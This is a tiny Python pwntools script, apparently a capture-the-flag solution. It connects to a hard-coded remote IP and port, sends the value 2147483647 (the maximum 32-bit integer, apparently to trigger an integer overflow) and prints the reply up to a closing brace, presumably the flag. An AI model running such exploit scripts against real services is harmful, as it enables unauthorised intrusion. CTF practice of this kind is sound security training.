from pwn import *

r = remote("35.231.63.121",1342)

r.recv(1024)

r.sendline("2147483647")

print(r.recvuntil("}"))

r.close()
